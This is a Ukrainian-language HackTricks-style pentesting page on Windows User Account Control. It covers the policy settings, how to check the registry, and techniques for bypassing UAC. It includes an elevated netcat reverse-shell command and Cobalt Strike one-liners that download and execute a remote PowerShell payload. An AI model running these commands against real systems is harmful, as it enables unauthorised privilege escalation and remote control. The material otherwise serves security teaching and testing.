# UAC - Контроль облікових записів користувачів

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Використовуйте [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) для легкого створення та **автоматизації робочих процесів**, що базуються на **найсучасніших** інструментах спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) - це функція, яка дозволяє **запит на згоду для підвищених дій**. Додатки мають різні рівні `integrity`, і програма з **високим рівнем** може виконувати завдання, які **можуть потенційно скомпрометувати систему**. Коли UAC увімкнено, програми та завдання завжди **виконуються в контексті безпеки облікового запису, що не є адміністратором**, якщо адміністратор явно не надає цим програмам/завданням доступ на рівні адміністратора для виконання. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але не вважається межою безпеки.

Для отримання додаткової інформації про рівні цілісності:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC активовано, користувачу-адміністратору надаються 2 токени: стандартний ключ користувача для виконання звичайних дій на звичайному рівні та один з адміністративними привілеями.

Ця [сторінка](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) детально обговорює, як працює UAC, включаючи процес входу, досвід користувача та архітектуру UAC. Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC, специфічної для їхньої організації на локальному рівні (використовуючи secpol.msc) або налаштовувати та розгортати через об'єкти групової політики (GPO) в середовищі домену Active Directory. Різні налаштування обговорюються детально [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Існує 10 налаштувань групової політики, які можна встановити для UAC. Наступна таблиця надає додаткові деталі:

| Налаштування групової політики                                                                                                                                                                                                                                                                                                                                                           | Ключ реєстру                | Налаштування за замовчуванням                                  |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | -------------------------------------------------------------- |
| [Контроль облікових записів користувачів: Режим затвердження адміністратора для вбудованого облікового запису адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Вимкнено                                                     |
| [Контроль облікових записів користувачів: Дозволити програмам UIAccess запитувати підвищення без використання захищеного робочого столу](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Вимкнено                                                     |
| [Контроль облікових записів користувачів: Поведінка запиту на підвищення для адміністраторів у режимі затвердження адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Запит на згоду для не-Windows бінарних файлів                  |
| [Контроль облікових записів користувачів: Поведінка запиту на підвищення для стандартних користувачів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Запит на облікові дані на захищеному робочому столі                 |
| [Контроль облікових записів користувачів: Виявлення установок програм і запит на підвищення](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Увімкнено (за замовчуванням для домашніх) Вимкнено (за замовчуванням для підприємств) |
| [Контроль облікових записів користувачів: Підвищувати лише виконувані файли, які підписані та перевірені](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Вимкнено                                                     |
| [Контроль облікових записів користувачів: Підвищувати лише програми UIAccess, які встановлені в захищених місцях](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Увімкнено                                                      |
| [Контроль облікових записів користувачів: Запускати всіх адміністраторів у режимі затвердження адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Увімкнено                                                      |
| [Контроль облікових записів користувачів: Переключитися на захищений робочий стіл під час запиту на підвищення](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Увімкнено                                                      |
| [Контроль облікових записів користувачів: Віртуалізувати помилки запису файлів і реєстру в місцях для кожного користувача](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Увімкнено                                                      |

### Теорія обходу UAC

Деякі програми **автоматично підвищуються**, якщо **користувач належить** до **групи адміністраторів**. Ці бінарні файли мають у своїх _**Маніфестах**_ опцію _**autoElevate**_ зі значенням _**True**_. Бінарний файл також повинен бути **підписаний Microsoft**.

Тоді, щоб **обійти** **UAC** (підвищити з **середнього** рівня цілісності **до високого**), деякі зловмисники використовують такі бінарні файли для **виконання довільного коду**, оскільки він буде виконуватися з **процесу високого рівня цілісності**.

Ви можете **перевірити** _**Маніфест**_ бінарного файлу, використовуючи інструмент _**sigcheck.exe**_ з Sysinternals. І ви можете **переглянути** **рівень цілісності** процесів, використовуючи _Process Explorer_ або _Process Monitor_ (з Sysinternals).

### Перевірка UAC

Щоб підтвердити, чи увімкнено UAC, виконайте:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Якщо це **`1`**, то UAC **активовано**, якщо це **`0`** або воно **не існує**, то UAC **неактивно**.

Потім перевірте, **який рівень** налаштовано:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Якщо **`0`**, тоді UAC не запитуватиме (як **вимкнено**)
- Якщо **`1`**, адміністратор **питається про ім'я користувача та пароль** для виконання бінарного файлу з високими правами (на Secure Desktop)
- Якщо **`2`** (**Завжди повідомляти мене**) UAC завжди запитуватиме підтвердження у адміністратора, коли він намагається виконати щось з високими привілеями (на Secure Desktop)
- Якщо **`3`**, як `1`, але не обов'язково на Secure Desktop
- Якщо **`4`**, як `2`, але не обов'язково на Secure Desktop
- Якщо **`5`**(**за замовчуванням**), він запитуватиме адміністратора підтвердити запуск не Windows бінарних файлів з високими привілеями

Тоді вам потрібно звернути увагу на значення **`LocalAccountTokenFilterPolicy`**\
Якщо значення **`0`**, тоді лише користувач **RID 500** (**вбудований адміністратор**) може виконувати **адміністративні завдання без UAC**, а якщо `1`, **всі облікові записи в групі "Administrators"** можуть це робити.

І, нарешті, зверніть увагу на значення ключа **`FilterAdministratorToken`**\
Якщо **`0`**(за замовчуванням), **вбудований обліковий запис адміністратора може** виконувати віддалені адміністративні завдання, а якщо **`1`**, вбудований обліковий запис адміністратора **не може** виконувати віддалені адміністративні завдання, якщо `LocalAccountTokenFilterPolicy` не встановлено на `1`.

#### Резюме

- Якщо `EnableLUA=0` або **не існує**, **немає UAC для нікого**
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=1`, немає UAC для нікого**
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` і `FilterAdministratorToken=0`, немає UAC для RID 500 (вбудований адміністратор)**
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` і `FilterAdministratorToken=1`, UAC для всіх**

Вся ця інформація може бути зібрана за допомогою модуля **metasploit**: `post/windows/gather/win_privs`

Ви також можете перевірити групи вашого користувача та отримати рівень цілісності:
```
net user %username%
whoami /groups | findstr Level
```
## UAC обхід

> [!NOTE]
> Зверніть увагу, що якщо у вас є графічний доступ до жертви, обхід UAC є простим, оскільки ви можете просто натиснути "Так", коли з'явиться запит UAC.

Обхід UAC потрібен у наступній ситуації: **UAC активовано, ваш процес працює в контексті середньої цілісності, і ваш користувач належить до групи адміністраторів**.

Важливо зазначити, що **набагато важче обійти UAC, якщо він на найвищому рівні безпеки (Завжди), ніж якщо він на будь-якому з інших рівнів (За замовчуванням).**

### UAC вимкнено

Якщо UAC вже вимкнено (`ConsentPromptBehaviorAdmin` є **`0`**), ви можете **виконати зворотний шелл з правами адміністратора** (високий рівень цілісності), використовуючи щось на зразок:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Обхід UAC з дублікацією токенів

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий "обхід" UAC (повний доступ до файлової системи)

Якщо у вас є оболонка з користувачем, який є в групі адміністраторів, ви можете **монтувати C$** спільний доступ через SMB (файлова система) локально на новий диск, і ви отримаєте **доступ до всього всередині файлової системи** (навіть до домашньої папки адміністратора).

> [!WARNING]
> **Схоже, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Обхід UAC з Cobalt Strike

Техніки Cobalt Strike працюватимуть лише в тому випадку, якщо UAC не встановлено на максимальному рівні безпеки.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** та **Metasploit** також мають кілька модулів для **обходу** **UAC**.

### KRBUACBypass

Документація та інструмент у [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Вразливості обходу UAC

[**UACME** ](https://github.com/hfiref0x/UACME), що є **компіляцією** кількох вразливостей обходу UAC. Зверніть увагу, що вам потрібно буде **скомпілювати UACME за допомогою visual studio або msbuild**. Компіляція створить кілька виконуваних файлів (як `Source\Akagi\outout\x64\Debug\Akagi.exe`), вам потрібно знати, **який з них вам потрібен.**\
Вам слід **бути обережними**, оскільки деякі обходи можуть **викликати інші програми**, які **попередять** **користувача** про те, що щось відбувається.

UACME має **версію збірки, з якої почали працювати кожна техніка**. Ви можете шукати техніку, що впливає на ваші версії:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також, використовуючи [this](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінку, ви отримуєте версію Windows `1607` з версій збірки.

#### Більше обходів UAC

**Усі** техніки, що використовуються тут для обходу AUC, **вимагають** **повної інтерактивної оболонки** з жертвою (звичайна оболонка nc.exe не підходить).

Ви можете отримати це, використовуючи сесію **meterpreter**. Міграція до **процесу**, у якого значення **Session** дорівнює **1**:

![](<../../images/image (96).png>)

(_explorer.exe_ має працювати)

### Обхід UAC з GUI

Якщо у вас є доступ до **GUI, ви можете просто прийняти запит UAC**, коли ви його отримаєте, вам насправді не потрібен обхід. Отже, отримання доступу до GUI дозволить вам обійти UAC.

Більше того, якщо ви отримаєте сесію GUI, яку хтось використовував (потенційно через RDP), є **деякі інструменти, які працюватимуть як адміністратор**, з яких ви могли б **запустити** **cmd** наприклад **як адміністратор** без повторного запиту UAC, як [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи більш **прихованим**.

### Гучний брутфорс обхід UAC

Якщо вам не важливо бути гучним, ви завжди можете **запустити щось на кшталт** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), що **питає підвищення прав, поки користувач не прийме це**.

### Ваш власний обхід - Основна методологія обходу UAC

Якщо ви подивитеся на **UACME**, ви помітите, що **більшість обходів UAC зловживають вразливістю Dll Hijacking** (в основному записуючи шкідливий dll у _C:\Windows\System32_). [Прочитайте це, щоб дізнатися, як знайти вразливість Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Знайдіть двійковий файл, який **авто підвищує** (перевірте, що при виконанні він працює на високому рівні цілісності).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Вам, ймовірно, потрібно буде **записати** DLL всередині деяких **захищених шляхів** (як C:\Windows\System32), де у вас немає прав на запис. Ви можете обійти це, використовуючи:
   1. **wusa.exe**: Windows 7, 8 і 8.1. Це дозволяє витягувати вміст CAB-файлу в захищені шляхи (оскільки цей інструмент виконується з високим рівнем цілісності).
   2. **IFileOperation**: Windows 10.
4. Підготуйте **скрипт** для копіювання вашого DLL у захищений шлях і виконання вразливого та авто підвищеного двійкового файлу.

### Інша техніка обходу UAC

Складається з спостереження, чи **авто підвищений двійковий файл** намагається **читати** з **реєстру** **ім'я/шлях** **двійкового файлу** або **команди**, що підлягає **виконанню** (це більш цікаво, якщо двійковий файл шукає цю інформацію в **HKCU**).

<figure><img src="../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Використовуйте [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), щоб легко створювати та **автоматизувати робочі процеси**, що підтримуються **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
